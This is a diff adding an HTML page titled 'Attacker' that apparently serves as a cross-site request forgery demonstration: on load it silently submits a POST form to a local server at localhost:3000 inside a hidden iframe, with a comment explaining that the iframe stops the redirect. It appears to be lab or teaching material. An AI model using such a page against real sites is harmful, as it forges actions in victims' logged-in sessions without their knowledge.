@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <title>Attacker</title>
+  </head>
+  <body onload="document.forms[0].submit()">
+    <form
+      action="http://localhost:3000"
+      method="post"
+      target="hiddenFrame"
+    ></form>
+    <!-- Added the iframe so that the page does not get redirected to the other site on submit. -->
+    <iframe name="hiddenFrame" style="display: none"></iframe>
+  </body>
+</html>
